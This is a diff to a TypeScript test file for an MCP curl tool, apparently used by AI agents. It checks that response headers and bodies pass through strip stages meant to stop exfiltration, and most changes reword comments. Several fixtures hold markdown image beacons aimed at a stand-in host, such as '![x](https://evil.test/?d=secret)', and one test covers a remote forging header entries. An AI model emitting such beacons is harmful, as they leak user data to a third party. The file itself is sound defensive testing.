@@ -96,7 +96,7 @@ const savedArtefacts: string[] = [];
 /**
  * The server-authored `[mcp-curl] …` notice, from whichever content entry holds
  * it. The notice is its own entry, never part of the body string (`LESSONS.md`
- * RC-46, `docs/todos/018`), so a test that reads `content[0]` finds the body.
+ * RC-46), so a test that reads `content[0]` finds the body.
  */
 function noticeOf(result: { content: Array<{ text: string }> }): string {
     return result.content.map((c) => c.text).find((t) => t.startsWith("[mcp-curl]")) ?? "";
@@ -112,10 +112,10 @@ describe("curl_execute include_headers — defence pipeline", () => {
     beforeEach(() => vi.clearAllMocks());
 
     it("strips an exfiltration beacon carried in a response header", async () => {
-        // Header text takes the SAME strip stages as the body (invariant 1a).
-        // Its own descriptor is what routes it around them if the pipeline is
-        // ever short-circuited for this channel, and this is the assertion that
-        // fails when that happens.
+        // Header text takes every strip stage `defendText` runs (invariant 1a);
+        // the body path takes none. Its own descriptor is what routes it around
+        // them if the pipeline is ever short-circuited for this channel, and this
+        // is the assertion that fails when that happens.
         const headers =
             "HTTP/2 200 \r\n" +
             "content-type: text/markdown\r\n" +
@@ -129,9 +129,8 @@ describe("curl_execute include_headers — defence pipeline", () => {
 
         // **The header text is content entry 1, not a prefix on entry 0** — each
         // remote region is its own MCP entry (invariant 13's strong form at the
-        // output, `docs/todos/018`), so the header channel is read where it
-        // actually is. What is asserted: header text takes the same strip stages
-        // as a body.
+        // output), so the header channel is read where it actually is. What is
+        // asserted: header text takes the strip stages.
         const headerText = result.content[1]!.text;
         expect(headerText).not.toContain("evil.test");
         expect(headerText).toContain("[image removed]");
@@ -159,7 +158,7 @@ describe("curl_execute include_headers — defence pipeline", () => {
 
     it("does not let a remote forge header entries from its body", async () => {
         // **A JSON body, because the subject is the SPLIT and only a JSON body
-        // has an inline arm (`docs/todos/018`).** The transcript the remote
+        // has an inline arm (`processor.ts::processResponse`).** The transcript the remote
         // is trying to pass off as headers is carried inside a JSON string
         // value, which is a stronger version of the same trick.
         const headers = "HTTP/2 200 \r\ncontent-type: application/json\r\n\r\n";
@@ -297,13 +296,14 @@ describe("curl_execute include_headers — boundary fidelity", () => {
 
     it("still splits and still strips behind a long remote-chosen Content-Type", async () => {
         // A Content-Type this long is legal. Against a fixed window shared with
-        // the separator it evicts it, and the strip stages are then silently
-        // deselected on an ordinary reply — see LIMITS.MAX_METADATA_TAIL_LENGTH.
+        // the separator it evicts it, and an ordinary reply then loses every
+        // metadata field and reads as having no known body end — see
+        // LIMITS.MAX_METADATA_TAIL_LENGTH.
         const longCt =
             'text/markdown; charset=utf-8; profile="' + "x".repeat(300) + '"';
         const headers =
             "HTTP/2 200 \r\nx-note: ![x](https://evil.test/?d=1)\r\n\r\n";
-        // A JSON body: only a JSON document is returned inline (`docs/todos/018`),
+        // A JSON body: only a JSON document is returned inline,
         // and this case reads `parsed.response`. The long declared type is the
         // subject — it must not evict the separator.
         mockedExecuteCommand.mockResolvedValue(curlOutputFor({ headerBlock: headers, body: '{"h":"hi"}', contentType: longCt }));
@@ -779,7 +779,7 @@ describe("curl_execute include_headers — remaining channels", () => {
         expect(onDisk).toBe(payload);
     });
 
-    it("does not strip a JSON body when the content type is undetermined", async () => {
+    it("does not strip a JSON body when the metadata block is missing", async () => {
         // A JSON body is never rewritten, metadata block or not: it is returned
         // inline as the origin sent it, and a saved one is the origin's octets —
         // the artefact jq_query reads back. A strip pass here would rewrite the
@@ -894,7 +894,7 @@ describe("curl_execute — both output shapes get the same defence", () => {
     const linkBody = "See [the docs](https://example.test/docs) for details.";
 
     for (const include_metadata of [false, true]) {
-        it(`rewrites markdown link syntax in a text/plain body (include_metadata: ${include_metadata})`, async () => {
+        it(`saves a text/plain body as the origin's octets (include_metadata: ${include_metadata})`, async () => {
             mockedExecuteCommand.mockResolvedValue(
                 curlOutputFor({ body: linkBody, contentType: "text/plain" })
             );
@@ -923,9 +923,10 @@ describe("curl_execute — both output shapes get the same defence", () => {
         // **The teeth for the pair above.** Those two assert a body arrives on
         // disk unchanged; a build that defended the artefact would fail them, and
         // a build that stopped saving at all would fail this one's byte equality.
-        // `text/markdown` is the declaration that selects the most aggressive
-        // stage set in `defendText`, so if any declared type could reach a strip
-        // stage from this path, it is this one.
+        // `defendText` takes no content type, so no declaration selects a stage;
+        // `text/markdown` is pinned because it is the one a type-keyed selector
+        // would treat most aggressively, so if any declared type could reach a
+        // strip stage from this path, it is this one.
         const body = "grab ![x](https://evil.test/?d=secret)";
         mockedExecuteCommand.mockResolvedValue(
             curlOutputFor({ body, contentType: "text/markdown" })
